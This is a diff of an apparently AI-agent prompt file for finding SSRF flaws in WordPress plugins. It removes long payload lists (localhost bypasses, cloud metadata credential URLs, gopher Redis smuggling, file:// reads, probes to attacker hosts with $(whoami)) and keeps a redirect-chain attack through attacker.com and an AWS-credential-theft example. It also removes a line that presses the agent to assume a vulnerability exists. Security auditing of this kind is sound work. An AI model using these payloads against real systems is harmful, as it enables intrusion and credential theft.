@@ -180,24 +180,7 @@ $image_data = file_get_contents( $image_url );
 **Why vulnerable:** `file_get_contents()` has zero restrictions — supports `file://`, `php://`, internal IPs, and all protocols. The fix replaced it with `wp_safe_remote_get()` which blocks internal IPs, `file://`, and restricts to HTTP(S).
 **Detection:** `file_get_contents($variable)` where `$variable` traces back to user input (`$_POST`, `$_GET`, `$_REQUEST`, shortcode attrs). Always vulnerable. Also check `wp_remote_get()` (partial protection) vs `wp_safe_remote_get()` (correct).
 
-### CVE-2019-16932: Visualizer — Blind SSRF via REST API Import
-**Impact:** Authenticated SSRF via chart data import, CVSS 7.7
-
-```php
-// REST route fetches URL to import chart data
-register_rest_route('visualizer/v1', '/fetch-data', array(
-    'callback' => 'fetch_remote_data',
-    // permission_callback was missing (unauthenticated) or too weak
-));
-function fetch_remote_data($request) {
-    $url = $request->get_param('url');
-    $response = wp_remote_get($url);  // SSRF: user controls destination
-    return wp_remote_retrieve_body($response);
-}
-```
-
-**Why vulnerable:** `wp_remote_get()` follows redirects and allows internal IPs. Even after the fix added an auth check, the SSRF sink remains for authenticated users. Correct fix requires `wp_safe_remote_get()` or `wp_http_validate_url()` before fetching.
-**Detection:** `wp_remote_get($url)` or `wp_remote_post($url)` in REST route callbacks or AJAX handlers where `$url` comes from request parameters. Check if `wp_safe_remote_get()` or `wp_http_validate_url()` is used instead.
+**CVE-2019-16932:** Visualizer — `wp_remote_get($url)` in REST route with user-controlled `$url`, no `wp_http_validate_url()`. CVSS 7.7.
 
 ### Key WordPress SSRF Function Reference
 
@@ -212,146 +195,15 @@ function fetch_remote_data($request) {
 
 ## Attack Techniques
 
-### 1. Localhost Bypass Techniques
-```
-# Standard localhost
-http://localhost
-http://127.0.0.1
-http://127.1
-http://127.0.1
-http://0.0.0.0
-http://0
+Standard SSRF bypasses (IP obfuscation, protocol smuggling, cloud metadata 169.254.169.254, DNS rebinding) apply. Focus on WordPress-specific vectors below.
 
-# IPv6 localhost
-http://[::1]
-http://[0:0:0:0:0:0:0:1]
-http://[::ffff:127.0.0.1]
-
-# Decimal IP (127.0.0.1 = 2130706433)
-http://2130706433
-
-# Hex IP
-http://0x7f.0x0.0x0.0x1
-http://0x7f000001
-
-# Octal IP
-http://0177.0.0.1
-http://0177.0.0.01
-
-# Mixed notation
-http://127.0.0.1.nip.io
-http://127.0.0.1.xip.io
-http://localtest.me  # Resolves to 127.0.0.1
-
-# URL encoding
-http://%31%32%37%2e%30%2e%30%2e%31
-
-# With credentials
-http://attacker:pass@127.0.0.1
-http://127.0.0.1:80@attacker.com  # Parser confusion
-```
-
-### 2. Cloud Metadata Endpoints
-```
-# AWS (IMDSv1)
-http://169.254.169.254/latest/meta-data/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://169.254.169.254/latest/user-data
-
-# AWS (IMDSv2 bypass attempts)
-# Requires token, but some configs allow v1 fallback
-
-# GCP
-http://169.254.169.254/computeMetadata/v1/
-http://metadata.google.internal/computeMetadata/v1/
-# Requires: Metadata-Flavor: Google header
-
-# Azure
-http://169.254.169.254/metadata/instance
-http://169.254.169.254/metadata/identity/oauth2/token
-# Requires: Metadata: true header
-
-# DigitalOcean
-http://169.254.169.254/metadata/v1/
-
-# Alibaba Cloud
-http://100.100.100.200/latest/meta-data/
-
-# Oracle Cloud
-http://169.254.169.254/opc/v1/
-
-# Kubernetes
-https://kubernetes.default.svc/
-```
-
-### 3. Protocol Smuggling
-```
-# File protocol (local file read)
-file:///etc/passwd
-file://localhost/etc/passwd
-
-# Gopher protocol (protocol smuggling)
-gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a  # Redis
-gopher://127.0.0.1:11211/_stats  # Memcached
-
-# Dict protocol
-dict://127.0.0.1:6379/info
-
-# FTP (may expose internal network)
-ftp://internal-server/
-```
-
-### 4. DNS Rebinding Attack
-```
-# Setup domain that alternates between:
-# 1st request: Returns attacker IP (passes validation)
-# 2nd request: Returns 127.0.0.1 (hits internal service)
-
-# Tools: rebinder.py, singularity, rbndr
-
-# Test domains
-http://a]@127.0.0.1  # URL parsing tricks
-http://foo@127.0.0.1:80@attacker.com
-```
-
-### 5. Redirect Chain Attack
+### Redirect Chain Attack
 ```python
 # Setup redirect server that redirects to internal IP
 # 1. Plugin fetches: http://attacker.com/redirect
 # 2. Server returns: 302 Location: http://169.254.169.254/
 # 3. Plugin follows redirect, hits metadata
-
-# PHP redirect server:
-# <?php header("Location: http://169.254.169.254/latest/meta-data/"); ?>
-```
-
-### 6. URL Parsing Inconsistencies
-```
-# Parser confusion between PHP and cURL
-http://attacker.com\@127.0.0.1  # Backslash
-http://attacker.com%2523@127.0.0.1  # Double encoding
-http://127.0.0.1#@attacker.com  # Fragment
-http://127.0.0.1?@attacker.com  # Query string
-
-# Unicode normalization
-http://127.0.0.①  # Unicode digit one
-http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ  # Circled letters
-```
-
-### 7. Blind SSRF Detection
-```python
-# DNS-based detection
-# Use Burp Collaborator, interact.sh, or own DNS server
-http://$(whoami).attacker-dns.com
-
-# Time-based
-# Compare response times:
-# - http://192.168.1.1:80 (open port, fast response)
-# - http://192.168.1.1:81 (closed port, slow/timeout)
-
-# Out-of-band HTTP
-http://attacker-server.com/ssrf-probe
-# Check server logs for incoming requests
+# WordPress follows up to 5 redirects by default — even wp_safe_remote_get()
 ```
 
 ---
@@ -436,22 +288,6 @@ wpguard_sandbox_request(
 
 ## Finding Creation
 
-**IMPORTANT: Every finding description MUST include a `## Prerequisites` section** using this exact structured format. Every field must be explicitly filled — no omissions, no vague descriptions.
-
-```markdown
-## Prerequisites
-- **Base plugins:** [WooCommerce 8.0+] or [None]
-- **Plugin settings:** [Settings > Uploads > Enable file uploads = ON] or [Default settings]
-- **Required content:** [At least one published product with featured image] or [None]
-- **Required roles/users:** [WooCommerce `customer` role] or [Default WordPress roles]
-- **WordPress config:** [Multisite enabled] or [Standard single-site]
-- **Sandbox setup steps:**
-  1. `wpguard_sandbox_install_plugin(slug="woocommerce")` or [None — no extra setup]
-```
-
-Every field MUST have either a specific value or an explicit "[None]" / "[Default ...]". Vague entries like "check plugin settings" will be rejected by QA.
-
-
 ```python
 wpguard_finding_create(
     plugin_slug="example-plugin",
@@ -459,40 +295,13 @@ wpguard_finding_create(
     active_installs=50000,
     vuln_type="ssrf",
     title="SSRF via Webhook URL Allows Cloud Metadata Access",
-    description="""
-## Vulnerability Summary
-User-controlled webhook URL is fetched server-side without proper validation, allowing SSRF attacks including cloud metadata access.
+    description="""## Vulnerability Summary
+User-controlled webhook URL fetched server-side via wp_remote_post() without destination validation.
 
 ## Data Flow
-Entry: Settings page webhook URL (subscriber+)
-  ↓
-Storage: update_option('plugin_webhook', sanitize_url($_POST['webhook_url']))
-  ↓
-Note: sanitize_url only validates format, not destination
-  ↓
-Trigger: On post publish, plugin fetches webhook
-  ↓
-Request: wp_remote_post(get_option('plugin_webhook'), $data)
-  ↓
-SSRF: Fetches user-controlled URL server-side
-
-## Prerequisites
-None — works with default plugin settings.
-
-## Exploitation
-1. Set webhook URL to: http://169.254.169.254/latest/meta-data/iam/security-credentials/
-2. Publish a post
-3. Plugin fetches AWS metadata
-4. If response is logged/returned, AWS credentials leaked
-
-## Bypass Used
-Localhost validation bypassed using: http://169.254.169.254 (AWS metadata, not localhost)
-
-## Impact
-- AWS credentials theft
-- Internal network scanning
-- Cloud infrastructure compromise
-- Access to internal services
+Entry: sanitize_url($_POST['webhook_url']) → update_option('plugin_webhook')
+Trigger: On post publish → wp_remote_post(get_option('plugin_webhook'), $data)
+Impact: Attacker sets URL to http://169.254.169.254/latest/meta-data/ → AWS credentials leaked
     """,
     auth_level="subscriber",
     cvss_score=8.6,
@@ -518,94 +327,4 @@ SSRF with limited protocols (http only): Reduce by 1.0
 
 ---
 
-## Common SSRF Targets
-
-```
-# Internal services to probe
-http://127.0.0.1:3306     # MySQL
-http://127.0.0.1:6379     # Redis
-http://127.0.0.1:11211    # Memcached
-http://127.0.0.1:9200     # Elasticsearch
-http://127.0.0.1:27017    # MongoDB
-http://127.0.0.1:5432     # PostgreSQL
-http://127.0.0.1:8080     # Common web services
-http://127.0.0.1:9000     # PHP-FPM
-
-# WordPress specific
-http://127.0.0.1/wp-admin/
-http://127.0.0.1/wp-config.php  # Via file://
-http://127.0.0.1/wp-content/debug.log
-
-# Cloud specific
-http://169.254.169.254    # All cloud providers
-http://metadata/          # GCP alternative
-```
-
----
-
-## Dynamic Validation REQUIRED
-
-**You MUST test findings in the sandbox before saving.** Static analysis alone is not sufficient.
-
-- **`status="validated"`** — ONLY if you performed a `wpguard_sandbox_request()` that confirms the vulnerability (e.g., server fetches attacker-controlled URL, internal service response returned, timing confirms blind SSRF)
-- **`status="draft"`** — If static analysis is promising but sandbox testing was inconclusive, failed, or you ran out of turns. Include what you tried and what happened.
-
-**Never save a finding as "validated" based on code reading alone.** A promising code path that fails dynamic testing is a draft, not a finding. This prevents false positives from wasting the entire downstream pipeline (PoC Writer → PoC Runner → QA).
-
----
-
-## Progress Saving (CRITICAL)
-
-**Save findings IMMEDIATELY as you discover them — do NOT accumulate findings in memory.**
-
-1. The moment you identify a vulnerability, call `wpguard_finding_create()` right away
-2. If unsure, create it as `status="draft"` — drafts are reviewed by QA, never lost
-3. Do NOT wait until the end to report — if you run out of context, unsaved findings are LOST
-4. The PM and poc-writer will handle PoC scripts — your job is to find vulns and save them
-
-### Progress Report (REQUIRED before finishing)
-
-Before your final response to the PM, save a progress report to `reports/{plugin_slug}/progress_{agent_name}.md` with:
-
-```markdown
-# Progress Report: {agent_name} on {plugin_slug}
-
-## Files Analyzed
-- [x] includes/ajax.php — fully analyzed
-- [x] includes/admin.php — fully analyzed
-- [ ] includes/api.php — partially analyzed (stopped at line 250)
-- [ ] lib/import.php — NOT analyzed
-
-## Findings Created
-- {finding_id}: {title} (status: {draft/validated})
-
-## Remaining Work
-- includes/api.php lines 250+ — has register_rest_route calls not yet reviewed
-- lib/import.php — contains unserialize() call, needs full trace
-- All shortcode handlers in includes/shortcodes/ — not yet checked
-
-## Notes
-- {any patterns observed, areas that looked promising but need more time}
-```
-
-**Why this matters:** If you run out of context, the PM will relaunch you (or another expert) with this progress report so analysis continues from where you left off instead of restarting from scratch.
-
----
-
-## When Finished
-
-Report all findings back to the PM. For each finding, include:
-- Vulnerability type, affected file/function/line
-- Data flow (entry point → processing → sink)
-- Authentication level required
-- Suggested CVSS score and vector
-- Whether exploitation was verified or if it's a draft finding (static analysis only)
-
-Also report:
-- **Progress report saved:** `reports/{plugin_slug}/progress_{agent_name}.md`
-- **Analysis complete:** YES / PARTIAL (ran out of context — {N} files remain)
-- If PARTIAL, list the most promising unanalyzed areas so the PM can relaunch
-
-The PM will coordinate the PoC Writer and verification pipeline.
-
-**Remember: The vulnerability IS there. Your job is to find it. Don't give up.**
+{{include:_expert-shared.md|validation_example=server fetches attacker-controlled URL, internal service response returned, timing confirms blind SSRF}}
